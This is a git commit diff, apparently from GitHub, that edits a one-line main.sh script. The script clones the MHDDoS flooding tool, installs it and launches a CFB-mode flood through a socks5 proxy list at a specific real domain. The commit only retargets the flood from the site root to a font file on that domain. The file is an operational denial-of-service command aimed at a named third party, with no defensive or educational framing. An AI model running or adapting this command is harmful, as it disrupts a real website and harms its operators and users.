1326512c891df4f18022439866e8f4e8c0b380cf
Nayuki Pro <91455547+Nayuki-Pro@users.noreply.github.com>
2022-05-16 09:10:28 +0800

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,1 +1,1 @@
-rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://xn--fiqs8sa8vl54erq8d.com'  1  1000 socks5.txt  100 6000
+rm -rf MHDDoS&&git clone https://github.com/MatrixTM/MHDDoS&&cd MHDDoS&&pip3 install -r requirements.txt&&python3 start.py CFB  'https://xn--fiqs8sa8vl54erq8d.com/theme/v2board/assets/static/Simple-Line-Icons.0cb0b9c5.woff2'  1  1000 socks5.txt  100 6000
